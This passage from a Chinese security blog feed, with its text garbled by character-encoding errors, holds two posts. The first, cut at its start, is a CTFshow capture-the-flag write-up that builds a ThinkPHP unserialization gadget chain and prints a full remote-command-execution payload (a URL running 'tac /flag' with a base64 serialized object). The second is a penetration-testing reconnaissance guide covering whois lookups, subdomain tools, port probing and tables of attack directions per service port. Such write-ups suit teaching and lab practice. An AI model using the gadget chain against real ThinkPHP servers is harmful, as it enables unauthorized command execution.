punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span> <span class="token comment">//PHPå‡½æ•°</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span>        <span class="token string single-quoted-string">'var_ajax'</span>         <span class="token operator">=></span> <span class="token string single-quoted-string">'_ajax'</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"var_ajax"</span><span class="token operator">=></span><span class="token string single-quoted-string">'lin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//PHPå‡½æ•°çš„å‚æ•°</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"visible"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>lin<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token operator">&amp;</span>data<span class="token operator">=</span>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> php-unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†</title>
      <link href="/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2024/07/07/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¿¡æ¯æ”¶é›†å†…å®¹"><a href="#ä¿¡æ¯æ”¶é›†å†…å®¹" class="headerlink" title="ä¿¡æ¯æ”¶é›†å†…å®¹"></a>ä¿¡æ¯æ”¶é›†å†…å®¹</h4><p>åœ¨åˆ’å®šäº†æµ‹è¯•èŒƒå›´ä¹‹åï¼Œå°±éœ€è¦è¿›å…¥ä¿¡æ¯æ”¶é›†é˜¶æ®µã€‚åœ¨è¿™ä¸ªé˜¶æ®µï¼Œæ¸—é€äººå‘˜éœ€è¦ä½¿ç”¨å„ç§å…¬å¼€èµ„æºå°½å¯èƒ½åœ°è·å–æµ‹è¯•ç›®æ ‡çš„ç›¸å…³ä¿¡æ¯ã€‚ä»–ä»¬æœé›†ä¿¡æ¯çš„äº’è”ç½‘æ¸ é“ä¸»è¦æœ‰ï¼šè®ºå›&#x2F;å…¬å‘Šæ¿&#x2F;æ–°é—»ç»„&#x2F;åª’ä½“æ–‡ç« &#x2F;åšå®¢&#x2F;ç¤¾äº¤ç½‘ç»œ&#x2F;github&#x2F;å…¶ä»–å•†ä¸šæˆ–éå•†ä¸šæ€§çš„ç½‘ç«™ã€‚æ­¤å¤–ï¼Œä»–ä»¬ä¹Ÿå¯ä»¥å€ŸåŠ©å„ç§æœç´¢å¼•æ“ä¸­è·å–ç›¸å…³æ•°æ®ï¼Œå¦‚è°·æ­Œã€é›…è™ã€MSNå¿…åº”ã€ç™¾åº¦ç­‰ã€‚æ”¶é›†çš„ä¿¡æ¯ä¸»è¦åŒ…æ‹¬:</p><p>ï¼ˆ1ï¼‰æ”¶é›†ç›®æ ‡ç½‘ç«™æœåŠ¡å™¨ä¿¡æ¯ï¼šåŸŸåã€å­åŸŸåã€CNAMEã€cdnã€çœŸå®IPã€ç³»ç»Ÿç±»å‹ã€ç‰ˆæœ¬ç­‰ï¼›</p><p>ï¼ˆ2ï¼‰è¯†åˆ«å¹¶æ”¶é›†ç›®æ ‡ç½‘ç«™æŒ‡çº¹ä¿¡æ¯ï¼šCMSã€ä¸­é—´ä»¶ã€ç½‘é¡µç¼–ç¨‹è¯­è¨€ç­‰åŠå…¶é€šç”¨æ¼æ´è°ƒæŸ¥æ”¶é›†ï¼›</p><p>ï¼ˆ3ï¼‰æ‰«æå¹¶æ”¶é›†ç›®æ ‡ç½‘ç«™ç›®å½•ç»“æ„ï¼šä¸€äº›æ–‡ä»¶å¯ä»¥è®¿é—®è·å¾—ä¿¡æ¯ã€åå°ç®¡ç†é¡µé¢ä½ç½®ã€æ—¥å¿—ä½ç½®ç­‰ï¼›</p><p>ï¼ˆ4ï¼‰ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ï¼š</p><p>whoisä¿¡æ¯ã€å§“åã€å¤‡æ¡ˆã€é‚®ç®±ã€ç”µè¯åæŸ¥ï¼ˆé‚®ç®±ä¸¢ç¤¾å·¥åº“ï¼Œç¤¾å·¥å‡†å¤‡ç­‰ï¼‰ï¼›<br>å¼±å£ä»¤æ‰«æã€å¯†ç çˆ†ç ´ç­‰ï¼ˆå¦‚é’ˆå¯¹ç³»ç»Ÿç®¡ç†å‘˜ã€ç½‘ç«™åå°ç®¡ç†å‘˜ã€æ•°æ®åº“ç®¡ç†å‘˜ç­‰ï¼‰ï¼›<br>ç½‘ç«™æºç æ˜¯å¦æ³„éœ²ç­‰ï¼Œå¦‚githubæºç ã€‚<br>ï¼ˆ5ï¼‰æ”¶é›†ç›®æ ‡æœåŠ¡å™¨ä¸»æœºç«¯å£ä¿¡æ¯ï¼šä¸åŒç«¯å£æä¾›ä¸åŒçš„æ”»å‡»æ€è·¯å’Œæ–¹å‘ï¼›</p><p>ï¼ˆ6ï¼‰ç½‘ç»œé˜²æŠ¤ä¿¡æ¯ï¼šç½‘ç»œè¾¹ç•Œè®¾å¤‡æˆ–ç½‘ç»œèŠ‚ç‚¹è®¾å¤‡ï¼Œå¦‚æœ‰æ²¡æœ‰é˜²ç«å¢™ï¼Œæœ‰æ²¡æœ‰IPSã€IDSæˆ–WAFï¼Œç½‘ç»œè¡Œä¸ºç®¡ç†ï¼Œå…¨æµé‡åˆ†æã€‚</p><p>æ”¶é›†çš„ä¿¡æ¯è¶Šå¤šï¼Œæ¸—é€æµ‹è¯•æˆåŠŸçš„æ¦‚ç‡è¶Šé«˜ã€‚<br>åœ¨ä¿¡æ¯æ”¶é›†ä¸­ï¼Œæœ€ä¸»è¦çš„å°±æ˜¯æ”¶é›†æœåŠ¡å™¨çš„é…ç½®ä¿¡æ¯å’Œç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬åŸŸååŠå­åŸŸåä¿¡æ¯ã€ç›®æ ‡ç½‘ç«™ç³»ç»Ÿã€CMSæŒ‡çº¹ã€ç›®æ ‡ç½‘ç«™çœŸå®IP ã€å¼€æ”¾çš„ç«¯å£ç­‰ã€‚æ¢å¥è¯è¯´ï¼Œåªè¦æ˜¯ä¸ç›®æ ‡ç½‘ç«™ç›¸å…³çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬éƒ½åº”è¯¥å»å°½é‡æœé›†ã€‚</p><h4 id="åŸŸåç›¸å…³ä¿¡æ¯"><a href="#åŸŸåç›¸å…³ä¿¡æ¯" class="headerlink" title="åŸŸåç›¸å…³ä¿¡æ¯"></a>åŸŸåç›¸å…³ä¿¡æ¯</h4><p>çŸ¥é“ç›®æ ‡çš„åŸŸåä¹‹åï¼Œæˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯è·å–åŸŸåçš„æ³¨å†Œä¿¡æ¯ï¼Œæ³¨æ„å…³æ³¨è¯¥åŸŸåçš„æ³¨å†Œå•†å’Œæ³¨å†Œäººçš„è”ç³»æ–¹å¼ï¼ˆç”µè¯å’Œé‚®ç®±ï¼‰ç­‰ä¿¡æ¯ã€‚</p><h5 id="åŸŸååˆ†ç±»"><a href="#åŸŸååˆ†ç±»" class="headerlink" title="åŸŸååˆ†ç±»"></a>åŸŸååˆ†ç±»</h5><p>å›½é™…åŸŸåï¼š.com(å•†ä¸šå…¬å¸);:net(ç½‘ç»œæœåŠ¡):.org(ç»„ç»‡åä¼šç­‰);.gov(æ”¿åºœéƒ¨é—¨);.edu(æ•™è‚²æœºæ„);.mil(å†›äº‹é¢†åŸŸ);.int(å›½é™…ç»„ç»‡)</p><p>å›½åˆ«åŸŸåï¼š.CNä»£è¡¨ä¸­å›½ï¼Œ.UKä»£è¡¨è‹±å›½ï¼Œ.USä»£è¡¨ç¾å›½ã€€</p><p>æ–°é¡¶çº§åŸŸåï¼šbiz,infoï¼Œnameï¼Œpro, aero, coop, museumâ€¦</p><h5 id="åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"><a href="#åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼" class="headerlink" title="åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"></a>åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼</h5><h6 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h6><p>Whoisæ˜¯ä¸€ä¸ªæ ‡å‡†çš„äº’è”ç½‘åè®®ï¼Œ å¯ç”¨äºæ”¶é›†åŸŸåæ³¨å†Œä¿¡æ¯ï¼Œæ³¨å†Œçš„åŸŸåã€IPåœ°å€ç­‰ä¿¡æ¯ã€‚ç®€å•æ¥è¯´ï¼Œ Whoiså°±æ˜¯ä¸€ä¸ªç”¨äºæŸ¥è¯¢åŸŸåæ˜¯å¦</p><p>å·±è¢«æ³¨å†Œä»¥åŠæ³¨å†ŒåŸŸåçš„è¯¦ç»†ä¿¡æ¯çš„æ•°æ®åº“ï¼ˆå¦‚åŸŸåæ‰€æœ‰äººã€åŸŸåæ³¨å†Œå•†ï¼‰ã€‚</p><p>åœ¨WhoisæŸ¥è¯¢ä¸­ï¼Œå¾—åˆ°æ³¨å†Œäººçš„å§“åå’Œé‚®ç®±ä¿¡æ¯é€šå¸¸å¯¹æµ‹è¯•ä¸ªäººç«™ç‚¹éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢å¼•æ“å’Œç¤¾äº¤ç½‘ç»œæŒ–æ˜å‡ºåŸŸåæ‰€æœ‰äºº</p><p>çš„å¾ˆå¤šä¿¡æ¯ã€‚å¯¹ä¸­å°ç«™ç‚¹è€Œè¨€ï¼ŒåŸŸåæ‰€æœ‰äººå¾€å¾€å°±æ˜¯ç®¡ç†å‘˜ã€‚</p><ul><li><strong>Kaliç³»ç»Ÿ</strong>ï¼šåœ¨Kaliç³»ç»Ÿä¸­ï¼Œ Whois å·±ç»é»˜è®¤å®‰è£…ï¼Œåªéœ€è¾“å…¥è¦æŸ¥è¯¢çš„åŸŸåå³å¯ï¼Œä»£ç ä¸º<code>whois+åŸŸå</code>ï¼ˆä¸€èˆ¬åŸŸåä¸åŒ…å«ä¸»æœºåï¼Œå¦‚</li></ul><p>Â·baidu.comï¼‰ã€‚æ³¨æ„ï¼ŒKaliç³»ç»Ÿéœ€è¿æ¥çœŸå®ç½‘ç»œï¼Œèƒ½ä¸Šç½‘ã€‚</p><ul><li><strong><a href="https://whois.chinaz.com/">ç«™é•¿ä¹‹å®¶</a></strong></li><li><strong><a href="https://whois.aliyun.com/">é˜¿é‡Œäº‘æŸ¥è¯¢</a></strong></li></ul><h6 id="åæŸ¥"><a href="#åæŸ¥" class="headerlink" title="åæŸ¥"></a>åæŸ¥</h6><p><a href="https://whois.chinaz.com/reverse/">é‚®ç®±åæŸ¥ æ³¨å†ŒäººåæŸ¥ ç”µè¯åæŸ¥</a></p><h6 id="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"><a href="#å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"></a>å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢</h6><ul><li><strong><a href="https://www.beianx.cn/">ICPå¤‡æ¡ˆæŸ¥è¯¢ç½‘</a></strong></li><li><strong><a href="http://www.tianyancha.como/">å¤©çœ¼æŸ¥</a></strong></li><li><strong><a href="https://beian.miit.gov.cn/?wm=gwo#/Integrated/index">ICP&#x2F;IPåœ°å€&#x2F;åŸŸåä¿¡æ¯å¤‡æ¡ˆç®¡ç†ç³»ç»Ÿ</a></strong></li></ul><h5 id="å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"><a href="#å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼" class="headerlink" title="å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼"></a>å­åŸŸåä¿¡æ¯æŸ¥è¯¢æ–¹å¼</h5><p>å­åŸŸåä¹Ÿå°±æ˜¯äºŒçº§åŸŸåï¼Œ æ˜¯æŒ‡é¡¶çº§åŸŸåä¸‹çš„åŸŸåã€‚å‡è®¾æˆ‘ä»¬çš„ç›®æ ‡ç½‘ç»œè§„æ¨¡æ¯”è¾ƒå¤§ï¼Œç›´æ¥ä»ä¸»åŸŸå…¥æ‰‹æ˜¾ç„¶æ˜¯å¾ˆä¸ç†æ™ºçš„ï¼Œ å› ä¸ºå¯¹äºè¿™ç§</p><p>è§„æ¨¡çš„ç›®æ ‡ï¼Œ ä¸€èˆ¬å…¶ä¸»åŸŸéƒ½æ˜¯é‡ç‚¹é˜²æŠ¤åŒºåŸŸï¼Œæ‰€ä»¥ä¸å¦‚å…ˆè¿›å…¥ç›®æ ‡çš„æŸä¸ªå­åŸŸï¼Œç„¶åå†æƒ³åŠæ³•è¿‚å›æ¥è¿‘çœŸæ­£çš„ç›®æ ‡ï¼Œè¿™æ— ç–‘æ˜¯ä¸ªæ¯”è¾ƒå¥½</p><p>çš„é€‰æ‹©ã€‚</p><ul><li><p><strong><a href="https://searchdns.netcraft.com/">Whatâ€™s that site running?</a></strong></p></li><li><p><strong><a href="https://github.com/euphrat1ca/LayerDomainFinder">Layerå­åŸŸåæŒ–æ˜æœº</a></strong></p></li><li><p><strong><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></strong></p></li><li><p><strong><a href="https://github.com/lijiejie/subDomainsBrute">subDomainsBrute</a></strong></p></li><li><p><strong>Googleè¯­æ³•  site:xxx.com</strong></p></li><li><p><strong><a href="https://crt.sh/">è¯ä¹¦é€æ˜åº¦å…¬å¼€æ›°å¿—æšä¸¾</a></strong></p></li></ul><h4 id="IPç›¸å…³ä¿¡æ¯"><a href="#IPç›¸å…³ä¿¡æ¯" class="headerlink" title="IPç›¸å…³ä¿¡æ¯"></a>IPç›¸å…³ä¿¡æ¯</h4><ul><li><p><strong><a href="http://ip.chinaz.com/">IPæŸ¥è¯¢</a></strong></p></li><li><p><strong><a href="https://ip.chinaz.com/linksip">åŒIPæŸ¥è¯¢</a></strong></p></li><li><p><strong><a href="https://www.maxmind.com/en/home">IPç»çº¬åº¦</a></strong></p></li></ul><h4 id="ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯"><a href="#ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯" class="headerlink" title="ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯"></a>ç«¯å£æœåŠ¡ç›¸å…³ä¿¡æ¯</h4><p>æŸ¥çœ‹æœ¬æœºç«¯å£</p><p>Windowsï¼šnetstat -aon|findstr 3306</p><p>Linux: netstat -an|grep 3306 </p><p>è¿œç¨‹æœºå™¨ç«¯å£</p><p>telnet 192.168.142.137 80 </p><p>wget 192.168.142.137 80 </p><p>nc -vz 192.168.142.137 445</p><h5 id="å¸¸è§ç«¯å£åŠæ¼æ´"><a href="#å¸¸è§ç«¯å£åŠæ¼æ´" class="headerlink" title="å¸¸è§ç«¯å£åŠæ¼æ´"></a>å¸¸è§ç«¯å£åŠæ¼æ´</h5><h6 id="æ–‡ä»¶å…±äº«æœåŠ¡"><a href="#æ–‡ä»¶å…±äº«æœåŠ¡" class="headerlink" title="æ–‡ä»¶å…±äº«æœåŠ¡"></a>æ–‡ä»¶å…±äº«æœåŠ¡</h6><table><thead><tr><th align="center">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td align="center">21&#x2F;22&#x2F;69</td><td>FTP&#x2F;SFTPæ–‡ä»¶ä¼ è¾“åè®®</td><td>å…è®¸åŒ¿åä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´å’Œå—…æ¢æ“ä½œ</td></tr><tr><td align="center">2049</td><td>NFSæœåŠ¡ï¼ˆNetworkFileSystemï¼‰</td><td>é…ç½®ä¸å½“</td></tr><tr><td align="center">139</td><td>SambaæœåŠ¡</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç å’Œæ‰§è¡Œ</td></tr><tr><td align="center">389</td><td>LDAPç›®å½•è®¿é—®åè®®</td><td>æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤</td></tr></tbody></table><h6 id="è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"><a href="#è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£" class="headerlink" title="è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"></a>è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</h6><table><thead><tr><th align="center">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td align="center">22</td><td>SSHè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€SSHéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ æ–‡ä»¶ä¼ è¾“</td></tr><tr><td align="center">23</td><td>Telnetè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td></tr><tr><td align="center">3389</td><td>RDPè¿œç¨‹æ¡Œé¢è¿æ¥</td><td>Shiftåé—¨ï¼ˆWindowsServer2003ä»¥ä¸‹çš„ç³»ç»Ÿï¼‰ã€çˆ†ç ´</td></tr><tr><td align="center">5900</td><td>VNC</td><td>å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td align="center">5632</td><td>PcAnywhereè¿œç¨‹æ§åˆ¶æœåŠ¡</td><td>æŠ“å¯†ç ã€ä»£ç æ‰§è¡Œ</td></tr></tbody></table><h6 id="æ•°æ®åº“æœåŠ¡ç«¯å£"><a href="#æ•°æ®åº“æœåŠ¡ç«¯å£" class="headerlink" title="æ•°æ®åº“æœåŠ¡ç«¯å£"></a>æ•°æ®åº“æœåŠ¡ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td></tr><tr><td>1433</td><td>MSSQLæ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤</td></tr><tr><td>1521</td><td>Oracleæ•°æ®åº“</td><td>TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹shell</td></tr><tr><td>5432</td><td>PostgreSQLæ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td></tr><tr><td>27017&#x2F;27018</td><td>MongoDB</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>6379</td><td>Redisæ•°æ®åº“</td><td>å¯å°è¯•æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td>5000</td><td>Sysbase&#x2F;DB2æ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥</td></tr></tbody></table><h6 id="é‚®ä»¶æœåŠ¡ç«¯å£"><a href="#é‚®ä»¶æœåŠ¡ç«¯å£" class="headerlink" title="é‚®ä»¶æœåŠ¡ç«¯å£"></a>é‚®ä»¶æœåŠ¡ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>25</td><td>SMTPé‚®ä»¶æœåŠ¡</td><td>é‚®ä»¶ä¼ªé€ </td></tr><tr><td>110</td><td>POP3åè®®</td><td>çˆ†ç ´ã€å—…æ¢</td></tr><tr><td>143</td><td>IMAPåè®®</td><td>çˆ†ç ´</td></tr></tbody></table><h6 id="ç½‘ç»œå¸¸è§åè®®ç«¯å£"><a href="#ç½‘ç»œå¸¸è§åè®®ç«¯å£" class="headerlink" title="ç½‘ç»œå¸¸è§åè®®ç«¯å£"></a>ç½‘ç»œå¸¸è§åè®®ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>53</td><td>DNSåŸŸåç³»ç»Ÿ</td><td>å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒ  ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td></tr><tr><td>67&#x2F;68</td><td>DHCPæœåŠ¡</td><td>åŠ«æŒã€æ¬ºéª—</td></tr><tr><td>161</td><td>SNMPåè®®</td><td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td></tr></tbody></table><h6 id="ç‰¹æ®ŠæœåŠ¡ç«¯å£"><a href="#ç‰¹æ®ŠæœåŠ¡ç«¯å£" class="headerlink" title="ç‰¹æ®ŠæœåŠ¡ç«¯å£"></a>ç‰¹æ®ŠæœåŠ¡ç«¯å£</h6><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>æ”»å‡»æ–¹å‘</th></tr></thead><tbody><tr><td>2181</td><td>ZookeeperæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>8069</td><td>ZabbixæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥</td></tr><tr><td>9200&#x2F;9300</td><td>ElasticsearchæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>11211</td><td>MemcachedæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>512&#x2F;513&#x2F;514</td><td>LinuxRexecæœåŠ¡</td><td>çˆ†ç ´ã€rloginç™»å½•</td></tr><tr><td>873</td><td>RsyncæœåŠ¡</td><td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td>3690</td><td>SVNæœåŠ¡</td><td>SVNæ³„éœ²ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>50000</td><td>SAPManagementConsole</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr></tbody></table><h5 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h5><p>Nmap ï¼ˆNetwork Mapper <a href="https://nmap.org/">https://nmap.org/</a></p><p>1ï¼‰æ‰«æä¸»æœº(HostiDiscovery)</p><p>2ï¼‰æ‰«æç«¯å£(Port Scanningï¼‰</p><p>3ï¼‰æ¢æµ‹æ“ä½œç³»ç»Ÿã€è½¯ä»¶ç‰ˆæœ¬ï¼ˆOperating System Detectionã€Version Detection)</p><p>å‚æ•°ç±»å‹</p><p>nmapâ€“help</p><ul><li><p>TARGETSPECIFICATIOM:è‡ªæ ‡ï¼Œå¯¹ä»€ä¹ˆè¿›è¡Œæ‰«æï¼Œæ¯”å¦‚æ˜¯åŸŸåã€TPæˆ–è€…ç½‘ç»œ</p></li><li><p>HOSTDISCOVERY:ä¸»æœºå‘ç°ï¼Œæ€ä¹ˆå¯¹ä¸»æœºè¿›è¡Œæ‰«æï¼Œæ¯”å¦‚ç®€å•æ‰«æï¼Œè¿˜æ˜¯å…¨éƒ¨ï¼Œæ‰«ä¸€éï¼Œæˆ–è€…ç”¨ç›¸åº”çš„åè®®æ‰«</p></li><li><p>SCANTECHNIOQUESï¼šæ‰«ææŠ€æœ¯ï¼Œåè®®æ—¥å‹ºè®¾ç½®</p></li><li><p>PORTSPECIFICATIONANDSCANORDER:ç«¯å£å’Œæ‰«æé¡ºåºè®¾ç½® SERVICEVERSIONDETECTION:æœåŠ¡å’Œç‰ˆæœ¬è¯†åˆ«</p></li><li><p>SCRIPT SCAN:ä½¿ç”¨è„šæœ¬ï¼Œnmapæœ¬èº«å†…ç½®äº†å¤§é‡çš„luaè„šæœ¬ï¼Œè€Œä¸”è¿˜å¯ä»¥è‡ªå·±ç¼–å†™è„šæœ¬</p></li><li><p>OS DETECTION:æ“ä½œç³»ç»Ÿè¯†åˆ«</p></li><li><p>TIMING AND PERFORMANCE:æ—¶é—´å’Œæ€§èƒ½è®¾ç½®ï¼Œæ¯”å¦‚æ‰«æé¢‘ç‡ã€é‡è¯•æ¬¡æ•°ç­‰ç­‰ FIREWALL&#x2F;IDS EVASION AND SPOOFING:é˜²ç«å¢™ç»•è¿‡å’Œæ¬ºéª—ï¼Œæ¯”å¦‚ä½¿ç”¨ä»£ç†å‡IPç­‰</p></li><li><p>OUTPUT:æŠŠæ‰«ææ¥å‡ºè¾“å‡ºåˆ°æ–‡ä»¶ MISCï¼šå¯ç”¨IPv6ç­‰ç­‰é…ç½®</p></li></ul><p>nmapæœ¬èº«å†…ç½®äº†å¤§é‡çš„luaè„šæœ¬ï¼Œè€Œä¸”è¿˜å¯ä»¥è‡ªå·±å·²ç¼–å†™è„šæœ¬ </p><p>Is 